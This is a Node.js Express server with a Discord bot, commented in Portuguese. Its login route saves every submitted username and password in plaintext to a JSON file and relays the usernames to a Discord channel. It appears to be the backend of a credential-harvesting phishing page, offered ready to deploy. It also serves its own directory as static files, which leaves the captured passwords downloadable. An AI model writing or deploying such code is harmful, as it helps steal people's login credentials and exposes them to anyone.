const express = require('express');
const fs = require('fs');
const path = require('path');
const { Client, GatewayIntentBits } = require('discord.js');
require('dotenv').config();

const app = express();
// O Railway define a porta automaticamente na variável process.env.PORT, por isso usamos ela como prioridade
const PORT = process.env.PORT || 3000;
const FILE_PATH = path.join(__dirname, 'usuarios_registrados.json');

// Middleware para processar requisições em formato JSON
app.use(express.json());

// Serve os arquivos estáticos (HTML, CSS, Imagens) da pasta atual
app.use(express.static(__dirname));

// Rota POST original que recebe os dados do formulário e salva no arquivo JSON
app.post('/api/salvar-login', (req, res) => {
    const novosDados = req.body;

    // Verifica se os campos obrigatórios foram enviados
    if (!novosDados.username || !novosDados.password) {
        return res.status(400).json({ erro: 'Dados incompletos.' });
    }

    // Lê o arquivo existente ou cria uma nova lista caso não exista
    fs.readFile(FILE_PATH, 'utf8', (err, data) => {
        let listaUsuarios = [];

        if (!err && data) {
            try {
                listaUsuarios = JSON.parse(data);
            } catch (parseErr) {
                console.error("Erro ao ler JSON existente, reiniciando arquivo:", parseErr);
            }
        }

        // Adiciona o novo registro de login à lista de forma incremental
        listaUsuarios.push(novosDados);

        // Escreve a lista atualizada de volta no arquivo de texto .json
        fs.writeFile(FILE_PATH, JSON.stringify(listaUsuarios, null, 2), (writeErr) => {
            if (writeErr) {
                console.error("Erro ao escrever no arquivo:", writeErr);
                return res.status(500).json({ erro: 'Erro interno ao salvar os dados.' });
            }

            console.log("Novo login registrado com sucesso!");
            return res.status(200).json({ mensagem: 'Login processado com sucesso.' });
        });
    });
});

// --- INTEGRACAO DO BOT DO DISCORD (Sua lógica traduzida) ---
const TOKEN = process.env.DISCORD_TOKEN;
const CANAL_LOG_ID = process.env.LOG_CHANNEL_ID;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// Função auxiliar para carregar os dados de forma síncrona apenas na inicialização do bot
function carregarDadosSincrono() {
    try {
        if (fs.existsSync(FILE_PATH)) {
            const conteudo = fs.readFileSync(FILE_PATH, 'utf-8');
            const dados = JSON.parse(conteudo);
            return Array.isArray(dados) ? dados : [dados];
        }
    } catch (e) {
        console.error("Erro ao ler JSON na inicialização do bot:", e.message);
    }
    return [];
}

client.once('ready', async () => {
    console.log(`Bot conectado com sucesso como: ${client.user.tag}`);

    if (CANAL_LOG_ID) {
        try {
            // Busca o canal de logs configurado no painel do Railway
            const canal = await client.channels.fetch(CANAL_LOG_ID);
            if (canal) {
                console.log(`Canal de logs identificado: #${canal.name}`);
                const usuarios = carregarDadosSincrono();

                if (usuarios.length > 0) {
                    await canal.send(`📅 **[LOG DE INICIALIZAÇÃO]** Verificados ${usuarios.length} registros no banco de dados local.`);
                    
                    for (const item of usuarios) {
                        const username = item.username || "Não informado";
                        const timestamp = item.timestamp || "Não informado";

                        const mensagem = 
                            `👤 **Usuário:** \`${username}\`\n` +
                            `📅 **Data de Registro:** \`${timestamp}\`\n` +
                            `────────────────`;
                        await canal.send(mensagem);
                    }
                } else {
                    await canal.send("⚠️ **[LOG]** Arquivo de usuários lido, mas nenhum registro foi encontrado.");
                }
            }
        } catch (error) {
            console.error("Erro ao enviar logs para o canal do Discord:", error.message);
        }
    } else {
        console.log("Aviso: LOG_CHANNEL_ID não está configurado nas variáveis de ambiente.");
    }
});

// Inicializa o bot do Discord se o token estiver presente
if (TOKEN) {
    client.login(TOKEN);
} else {
    console.log("Aviso: DISCORD_TOKEN não encontrado. O bot não será iniciado.");
}

// Inicializa o servidor na porta configurada (Seja local ou no Railway)
app.listen(PORT, () => {
    console.log(`Servidor rodando com sucesso na porta: ${PORT}`);
});
